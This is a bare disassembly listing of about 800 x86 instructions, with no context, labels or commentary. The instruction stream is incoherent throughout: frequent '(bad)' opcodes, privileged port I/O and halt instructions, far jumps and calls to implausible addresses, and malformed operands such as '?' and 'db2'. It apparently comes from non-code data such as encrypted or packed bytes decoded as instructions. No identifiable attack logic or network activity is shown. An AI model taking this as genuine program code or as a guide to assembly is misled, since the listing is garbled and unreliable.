  422ab6:	push   es
  422ab7:	push   eax
  422ab8:	jmp    0x422a40
  422aba:	jecxz  0x422aa5
  422abc:	mov    al,ds:0x185399ae
  422ac1:	fistp  QWORD PTR [ecx]
  422ac3:	es ret 0x579e
  422ac7:	cmp    DWORD PTR ds:0x3b4e0c0e,esp
  422acd:	cmp    eax,0x97a3e1fc
  422ad2:	or     al,0xd7
  422ad4:	push   ecx
  422ad5:	xchg   ebx,eax
  422ad6:	pop    edx
  422ad7:	enter  0xde06,0xf8
  422adb:	pop    ds
  422adc:	jbe    0x422a7a
  422ade:	mov    dh,0xd5
  422ae0:	jmp    0x422b50
  422ae2:	jle    0x422b14
  422ae4:	mov    ebx,0x9996e02
  422ae9:	fist   WORD PTR [ebx]
  422aeb:	dec    edx
  422aec:	mov    BYTE PTR [ebx-0x1bdf3aee],bl
  422af2:	cld    
  422af3:	hlt    
  422af4:	out    dx,al
  422af5:	mov    DWORD PTR [edx+0x1e],esi
  422af8:	mov    esi,0x8c9ef76d
  422afd:	fisubr WORD PTR [eax+0x53]
  422b00:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422b01:	in     al,dx
  422b02:	xchg   ecx,eax
  422b03:	inc    esi
  422b04:	fisub  DWORD PTR [esi]
  422b06:	xor    eax,0xfd527fd8
  422b0b:	adc    ebp,DWORD PTR [edi-0x1a]
  422b0e:	cmp    DWORD PTR [esi-0x374973de],esi
  422b14:	aas    
  422b15:	xlat   BYTE PTR ds:[ebx]
  422b16:	xchg   ecx,eax
  422b17:	(bad)  
  422b18:	inc    edx
  422b19:	in     eax,0x3e
  422b1b:	aas    
  422b1c:	jmp    0x422b36
  422b1e:	repnz (bad) 
  422b21:	inc    eax
  422b22:	jbe    0x422b46
  422b24:	inc    esp
  422b25:	fbld   TBYTE PTR [edx-0x58]
  422b28:	push   ds
  422b29:	xchg   ecx,eax
  422b2a:	scas   al,BYTE PTR es:[edi]
  422b2b:	call   0x1a773bcc
  422b30:	adc    al,0xdf
  422b32:	repnz pop ss
  422b34:	clc    
  422b35:	(bad)  [edi]
  422b37:	dec    edi
  422b38:	xchg   esp,eax
  422b39:	fild   WORD PTR [edx]
  422b3b:	popa   
  422b3c:	mov    esp,0x70def9d2
  422b41:	and    BYTE PTR [eax],al
  422b43:	push   cs
  422b44:	cmp    dh,bl
  422b46:	mov    eax,0xb379d5f
  422b4b:	pop    esp
  422b4c:	test   DWORD PTR [edi-0x25],0xbdd9f91f
  422b53:	mov    al,0x71
  422b55:	cli    
  422b56:	mov    edi,0xb5116ebf
  422b5b:	fistp  QWORD PTR [esi-0x198f034f]
  422b61:	out    0xc5,eax
  422b63:	add    ecx,ebp
  422b65:	addr16 xchg edx,eax
  422b67:	leave  
  422b68:	inc    ebx
  422b69:	pop    esp
  422b6a:	test   BYTE PTR [esi],ah
  422b6c:	(bad)  
  422b6d:	icebp  
  422b6e:	int3   
  422b6f:	adc    al,0x77
  422b71:	add    bh,ch
  422b73:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422b74:	mov    dl,0x16
  422b76:	sub    ah,al
  422b78:	(bad)  
  422b7a:	adc    eax,0xb76353c8
  422b7f:	pop    ss
  422b80:	sub    BYTE PTR [edi+0x8],al
  422b83:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422b84:	jmp    0x422bb1
  422b86:	sahf   
  422b87:	xchg   edx,eax
  422b88:	fild   DWORD PTR ds:0x3b2ad76f
  422b8e:	int    0xc8
  422b90:	mov    eax,0x636ba1bd
  422b95:	(bad)
  422b98:	fsubp  st(3),st
  422b9a:	cmp    eax,0xb9b61fcf
  422b9f:	fisubr WORD PTR [ebx-0x71]
  422ba2:	inc    ebx
  422ba3:	pop    edi
  422ba4:	retf   0xbb8d
  422ba7:	adc    al,0x27
  422ba9:	fistp  WORD PTR [eax+ebx*4-0x23]
  422bad:	loopne 0x422bbd
  422baf:	dec    esp
  422bb0:	mov    ds:0x878bfd90,eax
  422bb5:	outs   dx,DWORD PTR ds:[esi]
  422bb6:	sbb    ch,BYTE PTR [esi+ebx*1+0x75]
  422bba:	dec    eax
  422bbb:	enter  0xbc69,0x80
  422bbf:	icebp  
  422bc0:	mov    edx,0xdf4d9c06
  422bc5:	fisttp DWORD PTR [ecx+ecx*2-0x17]
  422bc9:	jae    0x422b55
  422bcb:	cwde   
  422bcc:	pop    ebp
  422bcd:	sbb    BYTE PTR ds:0x1bdf82b5,0x1c
  422bd4:	inc    edi
  422bd5:	dec    ebp
  422bd6:	shl    dl,1
  422bd8:	mov    ds:0x9e26f8f9,al
  422bdd:	int3   
  422bde:	rol    cl,1
  422be0:	pop    ds
  422be1:	push   es
  422be2:	add    BYTE PTR [esp+ecx*1],al
  422be5:	imul   ebp,DWORD PTR [eax+0x55],0x4b
  422be9:	and    eax,0xcfe485e8
  422bee:	repz cmp ecx,esp
  422bf1:	pushf  
  422bf2:	jl     0x422c63
  422bf4:	mov    al,0x5c
  422bf6:	inc    edi
  422bf7:	js     0x422bc6
  422bf9:	pop    es
  422bfa:	jmp    0x7f397ac
  422bff:	add    al,0xbf
  422c01:	cs dec edx
  422c03:	fmul   DWORD PTR [edx]
  422c05:	inc    edi
  422c06:	aaa    
  422c07:	loope  0x422bf4
  422c09:	add    BYTE PTR [edi],0x3
  422c0c:	out    dx,al
  422c0d:	shl    BYTE PTR [esi*4+0x6ea704f9],1
  422c14:	imul   esi,esp,0xffffffb5
  422c17:	xor    ebx,DWORD PTR [esi]
  422c19:	imul   edx,DWORD PTR [ecx],0xffffffc9
  422c1c:	jmp    0x422c27
  422c1e:	scas   al,BYTE PTR es:[edi]
  422c1f:	push   0xe7894c75
  422c24:	stos   DWORD PTR es:[edi],eax
  422c25:	fistp  QWORD PTR [esp+esi*4-0x6428928e]
  422c2c:	aad    0xef
  422c2e:	out    0x6d,eax
  422c30:	pop    ebx
  422c31:	pop    edi
  422c32:	popa   
  422c33:	mov    esp,0x56f61ae7
  422c38:	xchg   edi,eax
  422c39:	(bad)  
  422c3b:	push   edx
  422c3c:	sub    cl,BYTE PTR [eax-0x78]
  422c3f:	repnz mov ds:0xfe32fcc6,eax
  422c45:	add    bl,dh
  422c47:	mov    eax,ds:0xe19fff98
  422c4c:	call   0xd6a3a8f7
  422c51:	mov    ebp,0x2fb0fa50
  422c56:	std    
  422c57:	inc    edi
  422c58:	mov    ah,0x4d
  422c5a:	js     0x422bfa
  422c5c:	jno    0x422bfe
  422c5e:	xchg   esp,eax
  422c5f:	enter  0xa51a,0xd2
  422c63:	xor    eax,0xdffdd089
  422c68:	jmp    0x422ce5
  422c6a:	sbb    cl,bh
  422c6c:	push   ebx
  422c6d:	add    BYTE PTR ds:0x9667a02b,ah
  422c73:	retf   
  422c74:	scas   eax,DWORD PTR es:[edi]
  422c75:	call   0xcaa5:0x40fe9745
  422c7c:	es cmp ch,0xdf
  422c80:	fs jae 0x422cea
  422c83:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422c84:	sbb    DWORD PTR [esi+0x8],esp
  422c87:	enter  0xbbcd,0xa3
  422c8b:	dec    ebp
  422c8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422c8d:	push   ss
  422c8e:	adc    eax,0xd7fcbf66
  422c93:	(bad)  
  422c94:	outs   dx,DWORD PTR ds:[esi]
  422c95:	mov    BYTE PTR [ebp+0xdc15683],dh
  422c9b:	enter  0xfa6d,0xcb
  422c9f:	sub    bh,BYTE PTR [edx-0x14036a14]
  422ca5:	stos   DWORD PTR es:[edi],eax
  422ca6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422ca7:	out    0xbb,eax
  422ca9:	mov    BYTE PTR [ecx+0x12],cl
  422cac:	(bad)  
  422cad:	(bad)  
  422cae:	adc    esp,DWORD PTR [ecx*8-0x5dc99021]
  422cb5:	inc    edi
  422cb6:	arpl   WORD PTR [ecx+0x67fc9682],cx
  422cbc:	fldenv [esi+ecx*2-0x13485599]
  422cc3:	(bad)  
  422cc4:	fs jns 0x422c4b
  422cc7:	add    dh,BYTE PTR [edi-0x14d12ca3]
  422ccd:	lock lea ecx,ss:[edx+ecx*2+0x70]
  422cd3:	test   esi,ecx
  422cd5:	fild   WORD PTR [edi-0x21]
  422cd8:	sub    al,BYTE PTR ds:0x91860034
  422cde:	and    DWORD PTR [eax-0x12],ebp
  422ce1:	imul   eax,DWORD PTR [ebp-0x4274234f],0x17
  422ce8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422ce9:	adc    esi,DWORD PTR [edx+0x32]
  422cec:	push   es
  422ced:	ficom  WORD PTR [edi-0x2aa48918]
  422cf3:	sub    eax,0xfac89f1f
  422cf8:	pop    ss
  422cf9:	(bad)  
  422cfb:	mov    esp,0xf725f98
  422d00:	mov    ah,0x85
  422d02:	lahf   
  422d03:	xor    BYTE PTR [edx+0x219030dc],al
  422d09:	jmp    0xb8dabbd
  422d0e:	mov    ds:0xc804ebe4,al
  422d13:	xchg   esi,eax
  422d14:	add    al,0xa4
  422d16:	cmp    DWORD PTR [ecx-0xf2c2096],eax
  422d1c:	xchg   edi,eax
  422d1d:	inc    edi
  422d1e:	imul   ebx,DWORD PTR [eax+0x75fd8bc6],0x6e56c69c
  422d28:	lahf   
  422d29:	les    edx,FWORD PTR [ebx-0x38]
  422d2c:	rcr    BYTE PTR [ecx+edx*8+0x7b],1
  422d30:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422d31:	sub    DWORD PTR [esi-0x33d5df3],ebp
  422d37:	into   
  422d38:	push   esp
  422d39:	fs xchg edi,eax
  422d3b:	sti    
  422d3c:	push   cs
  422d3d:	mov    bl,0x73
  422d3f:	pushf  
  422d40:	add    al,0xe0
  422d42:	ror    eax,cl
  422d44:	dec    ecx
  422d45:	add    eax,0x915a1592
  422d4a:	std    
  422d4b:	hlt    
  422d4c:	push   esi
  422d4d:	jp     0x422cd4
  422d4f:	add    al,BYTE PTR [esi+0xbc8ba19]
  422d55:	cmp    DWORD PTR [ecx-0x171b3ae6],edx
  422d5b:	mov    ds:0xdb6ff5ee,eax
  422d60:	pop    es
  422d61:	fmul   DWORD PTR [edx-0x58]
  422d64:	pop    ebx
  422d65:	imul   eax,DWORD PTR [edi+ebx*8+0x13],0x973bfdf
  422d6d:	jecxz  0x422dc9
  422d6f:	dec    edx
  422d70:	mov    al,ds:0x49e8fcbf
  422d75:	jo     0x422ded
  422d77:	sub    BYTE PTR [ecx+0x73c8b038],0xab
  422d7e:	or     BYTE PTR [esi-0x67],ch
  422d81:	sbb    ebp,DWORD PTR [ebx]
  422d83:	mov    ds:0x35a8b3eb,al
  422d88:	in     al,dx
  422d89:	std    
  422d8a:	push   esp
  422d8b:	cwde   
  422d8c:	stos   DWORD PTR es:[di],eax
  422d8e:	xor    ecx,DWORD PTR [eax-0x13]
  422d91:	mov    es,WORD PTR [ecx-0x8]
  422d94:	retf   
  422d95:	jp     0x422dd9
  422d97:	pop    ebx
  422d98:	jo     0x422e0a
  422d9a:	out    0x25,eax
  422d9c:	std    
  422d9d:	fdiv   QWORD PTR [eax]
  422d9f:	jmp    0x283a07ba
  422da4:	dec    ebp
  422da5:	lds    ecx,FWORD PTR [ebx+ecx*8+0x1c]
  422da9:	(bad)  
  422dab:	data16 aad 0x97
  422dae:	jnp    0x422d98
  422db0:	jbe    0x422e1b
  422db2:	repz push eax
  422db4:	jmp    0x422e33
  422db6:	scas   eax,DWORD PTR es:[edi]
  422db7:	mov    ds:0x83e56614,eax
  422dbc:	adc    ebx,edi
  422dbe:	xchg   esi,eax
  422dbf:	iret   
  422dc0:	das    
  422dc1:	xor    cl,BYTE PTR [ebx+ebp*1+0x58fbfb1d]
  422dc8:	leave  
  422dc9:	sbb    BYTE PTR [edx],bh
  422dcb:	sbb    BYTE PTR [edi+0x1],dl
  422dce:	push   ecx
  422dcf:	inc    eax
  422dd0:	jmp    0x422d53
  422dd2:	sbb    al,0xda
  422dd4:	mov    al,0x7d
  422dd6:	mov    DWORD PTR [ebp+0x599b8aee],ebx
  422ddc:	and    ebx,DWORD PTR [edi-0x1d910cc1]
  422de2:	dec    ebp
  422de3:	enter  0x1b46,0x10
  422de7:	mov    dh,0x15
  422de9:	xor    eax,0x5cfdb508
  422dee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422def:	pop    esp
  422df0:	stos   DWORD PTR es:[edi],eax
  422df1:	out    dx,eax
  422df2:	xlat   BYTE PTR ds:[ebx]
  422df3:	daa    
  422df4:	ja     0x422d78
  422df6:	(bad)  
  422df7:	enter  0x9b1,0x1e
  422dfb:	nop
  422dfc:	pop    esi
  422dfd:	gs call 0x8875:0x1fa6eb4c
  422e05:	mov    ebx,0xdfde2bf6
  422e0a:	push   ebx
  422e0b:	lds    ebx,FWORD PTR [ebx+0x3beb15ca]
  422e11:	(bad)  
  422e12:	(bad)  
  422e13:	cmp    bl,BYTE PTR [esi+0x53]
  422e16:	(bad)  
  422e17:	sbb    al,0x8f
  422e19:	daa    
  422e1a:	push   ebp
  422e1b:	retf   0xdf2c
  422e1e:	jnp    0x422e11
  422e20:	ret    
  422e21:	into   
  422e22:	sub    DWORD PTR [ebx+eax*4],eax
  422e25:	pop    ds
  422e26:	stos   DWORD PTR es:[edi],eax
  422e27:	mov    gs,ecx
  422e29:	sub    ebp,0x57
  422e2c:	dec    edx
  422e2d:	inc    esp
  422e2e:	test   eax,0x41c5e2a8
  422e33:	enter  0xcab1,0xcd
  422e37:	mul    DWORD PTR [ebp-0x44]
  422e3a:	inc    eax
  422e3b:	mov    eax,0x334e2e7
  422e40:	test   DWORD PTR [ebx-0x69723583],0xebecc50f
  422e4a:	xchg   DWORD PTR [ebp-0xec1a0a7],esp
  422e50:	stos   BYTE PTR es:[edi],al
  422e51:	sub    edi,ebp
  422e53:	dec    edi
  422e54:	lds    esp,FWORD PTR [edx-0x7aa2e74d]
  422e5a:	dec    ecx
  422e5b:	iret   
  422e5c:	inc    edx
  422e5d:	ret    
  422e5e:	psrlq  mm5,QWORD PTR [ebx]
  422e61:	mov    ebp,0x3f57a075
  422e66:	std    
  422e67:	sub    esp,edx
  422e69:	jb     0x422df0
  422e6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422e6c:	and    dl,BYTE PTR [ebp-0x7c]
  422e6f:	enter  0xfae,0x55
  422e73:	xchg   ecx,eax
  422e74:	mov    al,0x42
  422e76:	neg    dh
  422e78:	jmp    0x422edf
  422e7a:	cwde   
  422e7b:	mov    dh,0x1f
  422e7d:	xor    BYTE PTR [ecx+edi*2+0x1c],cl
  422e81:	fcomip st,st(6)
  422e83:	bound  ebx,QWORD PTR [ecx-0x1a16f634]
  422e89:	je     0x422e88
  422e8b:	les    ecx,FWORD PTR [edx+0x5fc2dbb1]
  422e91:	(bad)  
  422e92:	mov    esi,0x5f9395c8
  422e97:	imul   eax,DWORD PTR [ecx-0x15299207],0xffffffca
  422e9e:	mov    bh,0x9
  422ea0:	push   cs
  422ea1:	mov    al,0xc6
  422ea3:	pop    eax
  422ea4:	cmp    eax,0x3ede3b64
  422ea9:	cmp    DWORD PTR [edi-0x16],edi
  422eac:	fiadd  WORD PTR [ecx+edx*1-0x80]
  422eb0:	mov    esi,DWORD PTR [ebp+0x3c]
  422eb3:	fwait
  422eb4:	pop    ds
  422eb5:	cli    
  422eb6:	jmp    FWORD PTR [ecx+0x16]
  422eb9:	mov    esi,0x178148a6
  422ebe:	je     0x422e9c
  422ec0:	xchg   ebx,eax
  422ec1:	fist   WORD PTR [ebx+0x1f91c689]
  422ec7:	or     cl,BYTE PTR ds:0xebcd2ed2
  422ecd:	or     BYTE PTR ds:0x9b7115b8,dh
  422ed3:	cmp    esi,DWORD PTR [ebp+0x7dda74df]
  422ed9:	arpl   ax,sp
  422edb:	clc    
  422edc:	lock sti 
  422ede:	cld    
  422edf:	std    
  422ee0:	mov    al,0x4
  422ee2:	or     eax,0xc470b825
  422ee7:	enter  0x24d2,0x24
  422eeb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422eec:	pusha  
  422eed:	xchg   edx,eax
  422eee:	lods   eax,DWORD PTR ds:[esi]
  422eef:	addr16 in al,0xc6
  422ef2:	test   al,0x48
  422ef4:	mov    dl,0xd0
  422ef6:	dec    ebp
  422ef7:	test   al,bh
  422ef9:	add    dh,BYTE PTR [ebx-0x35]
  422efc:	mov    bh,0x51
  422efe:	nop
  422eff:	ds ja  0x422e97
  422f02:	xchg   esp,eax
  422f03:	(bad)  
  422f04:	xchg   ebp,eax
  422f05:	xchg   esp,edi
  422f07:	cld    
  422f08:	push   es
  422f09:	sub    al,0xc7
  422f0b:	jp     0x422ef8
  422f0d:	pop    ecx
  422f0e:	or     al,0x5c
  422f10:	fmul   st(0),st
  422f12:	mov    eax,ds:0xea0b43c8
  422f17:	fcom   QWORD PTR [ecx-0xbaec535]
  422f1d:	enter  0x3b32,0x8b
  422f21:	fadd   DWORD PTR [ecx]
  422f23:	or     DWORD PTR [eax-0xe],esp
  422f26:	sbb    eax,0x12222767
  422f2b:	cs ss (bad) 
  422f2f:	cmp    DWORD PTR [ebp+ebx*1-0x24],edi
  422f33:	add    BYTE PTR [ebp+0x35d5fe69],al
  422f39:	and    al,0xdf
  422f3b:	jno    0x422efe
  422f3d:	or     BYTE PTR [ecx-0x250c5a3e],bh
  422f43:	lods   eax,DWORD PTR ds:[esi]
  422f44:	into   
  422f45:	pop    edx
  422f46:	std    
  422f47:	xchg   ebp,eax
  422f48:	xchg   BYTE PTR [esi-0x2e],bl
  422f4b:	pop    ebp
  422f4c:	test   eax,0x6692fd32
  422f51:	push   es
  422f52:	jae    0x422f7b
  422f54:	iret   
  422f55:	and    bh,BYTE PTR [edi+0x26046bc9]
  422f5b:	lock daa 
  422f5d:	ins    BYTE PTR es:[edi],dx
  422f5e:	daa    
  422f5f:	and    al,0x2f
  422f61:	and    eax,0x979b1afd
  422f66:	sbb    al,0xf1
  422f68:	into   
  422f69:	rcr    DWORD PTR [ecx-0x38],1
  422f6c:	sub    eax,0x83e67c13
  422f71:	inc    esi
  422f72:	inc    edx
  422f73:	call   0xc0dccd63
  422f78:	(bad)  
  422f79:	sti    
  422f7a:	jbe    0x422fa8
  422f7c:	or     DWORD PTR [ecx],ecx
  422f7e:	clc    
  422f7f:	lahf   
  422f80:	jge    0x422f2a
  422f82:	add    DWORD PTR [eax-0x44],ecx
  422f85:	adc    BYTE PTR [edx+0x1],0x81
  422f89:	das    
  422f8a:	std    
  422f8b:	xchg   ecx,eax
  422f8c:	push   0x998b4683
  422f91:	and    al,0xe6
  422f93:	mov    ebx,0x9f6b5d26
  422f98:	push   eax
  422f99:	fdiv   DWORD PTR [edi+edx*1+0x55]
  422f9d:	fisttp WORD PTR [esp+edx*2-0x6f40b42]
  422fa4:	jmp    0x422ff3
  422fa6:	retf   0x2633
  422fa9:	pop    edx
  422faa:	fisub  DWORD PTR [esi+ebx*4+0x7dcb26d0]
  422fb1:	imul   edx,ecx,0x33
  422fb4:	ret    0xc557
  422fb7:	dec    esp
  422fb8:	repz cli 
  422fba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422fbb:	sub    ebx,0xaaa4f23d
  422fc1:	or     BYTE PTR [ecx+0x58],ch
  422fc4:	mov    ah,0xdf
  422fc6:	lea    ecx,[edx+0x52f1709c]
  422fcc:	(bad)  
  422fcd:	sti    
  422fce:	xor    ah,ah
  422fd0:	jne    0x422fb1
  422fd2:	retf   
  422fd3:	cwde   
  422fd4:	mov    esp,0x7f15df16
  422fd9:	fbstp  TBYTE PTR [eax]
  422fdb:	dec    eax
  422fdc:	cmp    eax,0x44ff64f
  422fe1:	pop    ebp
  422fe2:	std    
  422fe3:	jns    0x422fd3
  422fe5:	cmp    BYTE PTR [ebp+ebx*8+0x400f937c],0xf6
  422fed:	cmp    eax,0x2875c812
  422ff2:	je     0x422f7d
  422ff4:	loope  0x422f7e
  422ff6:	or     eax,0x3249eb88
  422ffb:	imul   esi,DWORD PTR [edx-0x1799fb36],0xbaace4df
  423005:	mul    dh
  423007:	inc    eax
  423008:	out    0xea,al
  42300a:	call   DWORD PTR [ebx-0x1c]
  42300d:	pop    eax
  42300e:	jno    0x422fcc
  423010:	retf   
  423011:	inc    edi
  423012:	pop    es
  423013:	sub    al,0x3e
  423015:	fldl2e 
  423017:	and    DWORD PTR [edi+0x377fcc3],0xebe2a654
  423021:	pop    edi
  423022:	inc    esp
  423023:	loope  0x423048
  423025:	es push esi
  423027:	push   esi
  423028:	adc    ah,al
  42302a:	xlat   BYTE PTR ds:[ebx]
  42302b:	sub    al,0xf5
  42302d:	jge    0x422fd2
  42302f:	dec    eax
  423030:	cmp    BYTE PTR [edi],ah
  423032:	xor    DWORD PTR [esi+ebx*4],eax
  423035:	cmp    ebp,edi
  423037:	(bad)  
  423038:	int3   
  423039:	mov    dh,0x63
  42303b:	adc    esp,DWORD PTR [ebx-0x7b13c4d3]
  423041:	leave  
  423042:	mov    eax,cs
  423044:	out    0x3f,eax
  423046:	mov    ecx,0x81ed3d2b
  42304b:	dec    eax
  42304c:	daa    
  42304d:	mov    dh,0x6b
  42304f:	sub    esi,ecx
  423051:	fistp  QWORD PTR [ebx-0x510a8fda]
  423057:	and    al,0xb7
  423059:	sahf   
  42305a:	mov    WORD PTR [ebp+ebp*8+0x44],es
  42305e:	mov    dh,0x15
  423060:	in     eax,0xbf
  423062:	cdq    
  423063:	test   DWORD PTR [esi+0x1f],esp
  423066:	adc    bl,cl
  423068:	sub    dl,BYTE PTR [ebx-0x9]
  42306b:	cmp    BYTE PTR [eax-0x591e51e3],0x53
  423072:	xor    edi,0xffffffec
  423075:	cdq    
  423076:	sbb    al,0xee
  423078:	cmp    bh,BYTE PTR [ecx+0x1013dd3f]
  42307e:	pop    esi
  42307f:	iret   
  423080:	add    bl,BYTE PTR [esi+0x2d6b4b4c]
  423086:	pushf  
  423087:	sub    edi,edx
  423089:	ret    
  42308a:	cld    
  42308b:	dec    edi
  42308c:	das    
  42308d:	stos   DWORD PTR es:[edi],eax
  42308e:	adc    al,0x10
  423090:	pop    es
  423091:	xor    DWORD PTR [ebx],esi
  423093:	retf   
  423094:	sub    eax,0xcc2f4ccc
  423099:	jmp    0x80cbae42
  42309e:	ins    DWORD PTR es:[edi],dx
  42309f:	paddsb mm5,QWORD PTR [ecx-0x4c]
  4230a3:	mov    edx,0x73e81f90
  4230a8:	das    
  4230a9:	pop    eax
  4230aa:	int    0xcb
  4230ac:	push   edx
  4230ad:	and    esp,DWORD PTR [eax]
  4230af:	adc    edi,edx
  4230b1:	imul   ecx,ebp,0x7
  4230b4:	outs   dx,DWORD PTR ds:[esi]
  4230b5:	lea    esp,[ecx]
  4230b7:	out    0x13,eax
  4230b9:	xchg   edi,eax
  4230ba:	cld    
  4230bb:	sar    BYTE PTR [edi],cl
  4230bd:	inc    edx
  4230be:	mov    ebx,0xda69b138
  4230c3:	(bad)  
  4230c4:	sub    ebx,DWORD PTR [eax-0x30c7c9c7]
  4230ca:	jb     0x42306f
  4230cc:	jmp    0x42313c
  4230ce:	pop    es
  4230cf:	mov    esi,0xc2d16dce
  4230d4:	sub    bl,dh
  4230d6:	fcmovu st,st(5)
  4230d8:	test   al,0xeb
  4230da:	add    eax,0x194f15d6
  4230df:	ss out dx,al
  4230e1:	cmp    DWORD PTR [edi],ebx
  4230e3:	inc    eax
  4230e4:	jbe    0x423105
  4230e6:	out    0x8b,eax
  4230e8:	mov    bh,BYTE PTR [edx+0x2a]
  4230eb:	enter  0x96bc,0xb2
  4230ef:	dec    ecx
  4230f0:	or     DWORD PTR [ebp+ebx*4-0x71],ebx
  4230f4:	out    dx,al
  4230f5:	das    
  4230f6:	mov    esp,esi
  4230f8:	and    dh,bh
  4230fa:	retf   0x289f
  4230fd:	cli    
  4230fe:	les    edx,FWORD PTR [esi+0x64c0df97]
  423104:	adc    al,0x14
  423106:	outs   dx,DWORD PTR ds:[esi]
  423107:	pop    esp
  423108:	push   0xfd3b0bb9
  42310d:	cmp    al,BYTE PTR [edx]
  42310f:	out    0xab,al
  423111:	aaa    
  423112:	xor    BYTE PTR [ecx-0x342b3e76],0x6
  423119:	xchg   ebx,eax
  42311a:	out    0x42,eax
  42311c:	lds    esp,FWORD PTR [esi-0x3]
  42311f:	lods   al,BYTE PTR ds:[esi]
  423120:	mov    ds:0x80297c1c,al
  423125:	fcom   QWORD PTR [eax-0x48ff5a38]
  42312b:	(bad)  [esi]
  42312d:	ins    DWORD PTR es:[edi],dx
  42312e:	jp     0x4230b0
  423130:	sbb    DWORD PTR [ecx-0x33c4db03],edx
  423136:	inc    edi
  423137:	push   ds
  423138:	jp     0x42317a
  42313a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42313b:	sub    al,0xe4
  42313d:	fsub   QWORD PTR [edi]
  42313f:	sar    BYTE PTR [edi],0xd
  423142:	loop   0x4231b5
  423144:	dec    ebx
  423145:	data16 into 
  423147:	push   es
  423148:	jmp    0x2fac3414
  42314d:	inc    edx
  42314e:	xchg   DWORD PTR [eax-0x495e676e],ebp
  423154:	cs add al,0x95
  423157:	leave  
  423158:	dec    edx
  423159:	jle    0x423112
  42315b:	inc    edi
  42315c:	out    dx,eax
  42315d:	inc    edi
  42315e:	push   ebp
  42315f:	cmp    al,0xeb
  423161:	inc    ebx
  423162:	push   0xa28b2489
  423167:	(bad)  
  423168:	mov    ebp,0x27dbbadf
  42316d:	pop    eax
  42316e:	push   edx
  42316f:	mov    WORD PTR [ecx-0x3d3a028b],?
  423175:	mov    ds:0x202a0d0b,al
  42317a:	cmp    ecx,eax
  42317c:	cwde   
  42317d:	push   edi
  42317e:	dec    edx
  42317f:	push   cs
  423180:	xchg   esp,eax
  423181:	pop    edx
  423182:	outs   dx,DWORD PTR ds:[esi]
  423183:	adc    ebx,ebp
  423185:	pop    esi
  423186:	pop    edi
  423187:	sub    eax,0xd8e445b
  42318c:	scas   al,BYTE PTR es:[edi]
  42318d:	fbld   TBYTE PTR [edi+eiz*4]
  423190:	dec    esp
  423191:	fcomp  DWORD PTR [ecx-0x63]
  423194:	(bad)  
  423195:	xor    ebp,edi
  423197:	sbb    al,0x98
  423199:	or     eax,0xbf5ca367
  42319e:	inc    ebx
  42319f:	enter  0xf2f6,0x1
  4231a3:	mov    al,ch
  4231a5:	nop
  4231a6:	add    ebx,DWORD PTR [ecx+0x762a9beb]
  4231ac:	sub    al,0x56
  4231ae:	pushf  
  4231af:	(bad)  
  4231b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4231b1:	outs   dx,DWORD PTR ds:[esi]
  4231b2:	add    ecx,eax
  4231b4:	aad    0xf0
  4231b6:	clc    
  4231b7:	or     eax,0x4568379f
  4231bc:	jmp    0x4231e7
  4231be:	xlat   BYTE PTR ds:[ebx]
  4231bf:	fisubr WORD PTR [edx+edx*1+0xe]
  4231c3:	mov    ds:0x203eac0,eax
  4231c8:	or     ebx,DWORD PTR [edi-0xf]
  4231cb:	nop
  4231cc:	int3   
  4231cd:	loop   0x4231f1
  4231cf:	ja     0x4231bd
  4231d1:	pop    ss
  4231d2:	shl    ch,cl
  4231d4:	adc    al,0x4a
  4231d6:	js     0x4231e2
  4231d8:	aaa    
  4231d9:	les    ebx,FWORD PTR [eax-0x38]
  4231dc:	sbb    BYTE PTR [edx-0x5be21a7c],bh
  4231e2:	or     ecx,edx
  4231e4:	repnz mov eax,ds:0x5f782ecf
  4231ea:	enter  0x5af9,0x2f
  4231ee:	jb     0x4231b8
  4231f0:	xor    DWORD PTR [edx-0x14],eax
  4231f3:	aas    
  4231f4:	dec    ebx
  4231f5:	inc    ecx
  4231f6:	ins    BYTE PTR es:[edi],dx
  4231f7:	call   0x4e9f430b
  4231fc:	sub    edx,DWORD PTR [edi-0x3]
  4231ff:	inc    ebx
  423200:	pop    edi
  423201:	xchg   BYTE PTR ds:0xe2bb7bc9,cl
  423207:	mov    ebx,0xe0b4ca6f
  42320c:	in     eax,dx
  42320d:	mov    BYTE PTR [edi-0x79],dl
  423210:	or     edx,DWORD PTR [ecx-0xe]
  423213:	je     0x42324d
  423215:	push   0x41
  423217:	pop    ebp
  423218:	fistp  QWORD PTR ds:[ecx]
  42321b:	pop    eax
  42321c:	xor    BYTE PTR [edi-0x210bc378],dh
  423222:	mov    ds:0x29e189be,al
  423227:	loopne 0x423264
  423229:	pop    edi
  42322a:	(bad)  
  42322b:	frstor [ebx+eax*1]
  42322e:	xchg   esi,eax
  42322f:	mov    ebx,cs
  423231:	add    al,0x5
  423233:	sbb    BYTE PTR [esi+0x50],ch
  423236:	jg     0x423247
  423238:	sub    eax,DWORD PTR [eax]
  42323a:	xor    BYTE PTR [edx-0x71],al
  42323d:	jo     0x42323c
  42323f:	pop    edi
  423240:	jl     0x4231cb
  423242:	mov    esp,0xefd81b46
  423247:	enter  0xebf,0xeb
  42324b:	mov    gs,WORD PTR [esi]
  42324d:	sar    DWORD PTR [esi-0x57b462cf],cl
  423253:	inc    esp
  423254:	pop    ebx
  423255:	call   0xb4131c56
  42325a:	out    dx,eax
  42325b:	out    dx,al
  42325c:	aaa    
  42325d:	jne    0x423240
  42325f:	(bad)  
  423260:	int    0xdd
  423262:	mov    ds:0x3cf22d9f,eax
  423267:	pop    edx
  423268:	loope  0x42328a
  42326a:	push   esp
  42326b:	leave  
  42326c:	xlat   BYTE PTR ds:[ebx]
  42326d:	lods   eax,DWORD PTR ds:[esi]
  42326e:	jmp    0xbdc869fd
  423273:	pop    eax
  423274:	and    ebp,ebx
  423276:	or     al,0xe
  423278:	mov    db2,eax
